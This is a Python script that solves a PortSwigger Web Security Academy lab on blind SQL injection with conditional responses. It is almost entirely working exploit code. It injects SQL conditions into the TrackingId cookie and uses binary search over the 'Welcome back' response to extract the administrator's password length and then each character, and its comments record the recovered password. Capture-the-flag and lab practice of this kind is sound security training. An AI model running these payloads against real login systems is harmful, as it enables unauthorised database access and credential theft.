""" 
MIT License

Copyright (c) 2024 [HackHuang]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

ADDITIONAL DISCLAIMER:
This software is intended for educational and security research purposes only.
Users are solely responsible for ensuring compliance with all applicable laws
and regulations. The author does not encourage or condone the use of this 
software for malicious purposes.
"""

# Author: HackHuang
# Description: For Lab: Blind SQL injection with conditional responses
# Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Last Modified: 2024/12/26

import requests
import tracemalloc
import time
import re
from typing import *
from contextlib import contextmanager

LOWERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('a','b','c','d','e','f','g','h','i','j','k','l','m','n',
                                               'o','p','q','r','s','t','u','v','w','x','y','z')
UPPERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N',
                                               'O','P','Q','R','S','T','U','V','W','X','Y','Z')
NUMBER_CHAR_LIST: Final[Tuple[str, ...]] = ('0','1','2','3','4','5','6','7','8','9')
# 1.Note that "\\" will output: "\"
# 2.Note that '—'(8212) is difference from '-'(45)
OTHERS_CHAR_LIST: Final[Tuple[str, ...]] = (' ', ',', '"', '#', '$', '%', '&', "'", '(', ')', '*', ',', '.', 
                                            '/', ';', '<', '=', '>', '@', '[', "\\", ']', '_', '`', '{', '|', '}', '©', '€', '—', '!', '-',)

# all_char_sorted_list: All char lists included, such as four lists as above
all_char_list: List[str] = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
all_char_ascii_list: List[int] = [ord(char) for char in all_char_list]
all_char_ascii_sorted_list: List[int] = sorted(all_char_ascii_list)
all_char_sorted_list: List[str] = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]

host: str = "0abf00e804490479820c434000bf0064.web-security-academy.net" # Should be updated after the lab time out
url: str = f"https://{host}/login"
session: str = "session=G594D5xbfmpnjtQcxHgAygp7iQMFg8uI" # Should be updated after the lab time out
tracking_id: str = f"TrackingId=n81cSXoXk9B1jOid" # Should be updated after the lab time out

@contextmanager
def print_code_snippet_performance(operation: str) -> Generator[None, None, None]:
    tracemalloc.start()
    start_time = time.perf_counter()
    print(f'Starting {operation}')
    yield
    current_memory, peak_memory = tracemalloc.get_traced_memory()
    end_time = time.perf_counter()
    print(f'Memory usage:\t\t {current_memory / 10**6:.6f} MB \n'
          f'Peak memory usage:\t {peak_memory / 10**6:.6f} MB')
    print(f'Finished {operation} in {end_time - start_time:.6f} seconds\n')
    tracemalloc.stop()

def get_method(url: str, headers: Dict[str, str], pattern: str) -> bool:
    reponse = requests.get(url=url, headers=headers)
    return True if re.search(pattern=pattern, string=reponse.text) else False

def length_binary_search(sql_1: str, sql_2: str, range: Tuple[int], pattern: str) -> int:
    low: int = range[0]
    high: int = range[1]
    while low <= high:
        mid: int = (low + high) // 2
        sql_injection_1:str = sql_1 + str(mid) + '--+'
        sql_injection_2:str = sql_2 + str(mid) + '--+'
        cookie_1 = tracking_id + sql_injection_1 + "; " + session
        cookie_2 = tracking_id + sql_injection_2 + "; " + session
        if get_method(url=url, headers={"Host": host, "Cookie": cookie_1}, pattern=pattern):
            print(f'Get the length successfully ---> {sql_injection_1}')
            return mid
        elif get_method(url=url, headers={"Host": host, "Cookie": cookie_2}, pattern=pattern):
            print(f'({low}, {mid}, {high}) ---> {sql_injection_2}')
            low = mid + 1
        else:
            print(f'({low}, {mid}, {high}) ---> OPPOSITE : {sql_injection_2}')
            high = mid - 1
    return -1

def data_binary_search(sql_1: str, sql_2: str, pattern: str) -> int:  
    low: int = 0
    high: int = len(all_char_ascii_sorted_list) - 1
    while low <= high:
        mid: int = (low + high) // 2
        char_ascii: int = all_char_ascii_sorted_list[mid]
        sql_injection_1: str = sql_1 + f'{char_ascii}' + '--+'
        sql_injection_2: str = sql_2 + f'{char_ascii}' + '--+'
        cookie_1 = tracking_id + sql_injection_1 + "; " + session
        cookie_2 = tracking_id + sql_injection_2 + "; " + session
        if get_method(url=url, headers={"Host": host, "Cookie": cookie_1}, pattern=pattern):
            print(f'Get the char index successfully ---> {sql_injection_1}')
            return mid
        elif get_method(url=url, headers={"Host": host, "Cookie": cookie_2}, pattern=pattern):
            print(f'({low}, {mid}, {high}) ---> {sql_injection_2}')
            low = mid + 1
        else:
            print(f'({low}, {mid}, {high}) ---> OPPOSITE : {sql_injection_2}')
            high = mid - 1
    return -1

def get_length_with_binary_search(pattern: str) -> int:
    sql_injection_1: str = f"' and length((select password from users where username='administrator')) = "
    sql_injection_2: str = f"' and length((select password from users where username='administrator')) > "
    length: int = length_binary_search(sql_1=sql_injection_1, sql_2=sql_injection_2, range=(1, 100), pattern=pattern)
    if length == -1:
        print(f'The length out of range!')
        exit()
    return length

def get_data_with_binary_search(password_length: int, pattern: str) -> str:
    data_str: str = ''
    count: int = 0
    substr_begin_index: int = 1
    while count < password_length:
        sql_injection_1: str = f"' and ascii(substr((select password from users where username='administrator'), {substr_begin_index}, 1)) = "
        sql_injection_2: str = f"' and ascii(substr((select password from users where username='administrator'), {substr_begin_index}, 1)) > "
        data_char_ascii_index: int = data_binary_search(sql_1=sql_injection_1, sql_2=sql_injection_2, pattern=pattern)
        if data_char_ascii_index == -1:
            print(f'Not found the index of data char')
            break
        else:
            data_char_ascii = all_char_ascii_sorted_list[data_char_ascii_index]
            data_str = data_str + chr(data_char_ascii)
            substr_begin_index = substr_begin_index + 1
            count = count + 1
            print(f'Got the password : {data_str}, and its length : {len(data_str)}\n')
    return data_str

# The password length is : 20
# Memory usage:            0.027557 MB 
# Peak memory usage:       0.095459 MB
# Finished get password length with binary search:  in 39.818222 seconds
with print_code_snippet_performance('get password length with binary search: '):
    password_length: int = get_length_with_binary_search(pattern='Welcome back')
    print(f'The password length is : {password_length}')

# The final password is : 1hkebkf648tdu5e8lx0k
# Memory usage:            0.006935 MB 
# Peak memory usage:       0.074337 MB
# Finished get password data with binary search:  in 546.722004 seconds
with print_code_snippet_performance('get password data with binary search: '):
    password_str: str = get_data_with_binary_search(password_length=password_length, pattern='Welcome back')
    print(f'The final password is : {password_str}')